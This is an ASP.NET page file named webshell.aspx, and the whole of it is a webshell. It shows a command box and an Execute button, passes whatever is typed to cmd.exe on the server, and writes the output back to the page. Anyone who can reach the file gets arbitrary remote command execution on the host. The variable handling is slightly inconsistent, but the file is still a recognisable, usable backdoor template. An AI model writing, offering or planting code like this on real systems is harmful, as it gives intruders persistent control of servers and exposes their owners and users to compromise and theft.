<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="webshell.aspx.cs" Inherits="YourNamespace.Default" %>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
            <b>Command:</b>
            <asp:TextBox ID="cmdTextBox" runat="server" Width="80"></asp:TextBox>
            <asp:Button ID="executeButton" runat="server" Text="Execute" OnClick="ExecuteCommand" />
            <hr />
            <pre><b>RemoteHost&gt; <font color="red"><%= cmdOutput %></font></b></pre>
        </div>
    </form>
    <% 
    string cmd = cmdTextBox.Text.Trim();
    string output = string.Empty;
    
    if (IsPostBack)
    {
        output = "RemoteHost> <font color=\"red\">" + cmd + "</font><hr>";
        System.Diagnostics.Process process = new System.Diagnostics.Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/C " + cmd;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.CreateNoWindow = true;

        process.Start();
        output += "<pre>" + process.StandardOutput.ReadToEnd() + "</pre>";
        process.WaitForExit();
    }
    %>
</body>
</html>
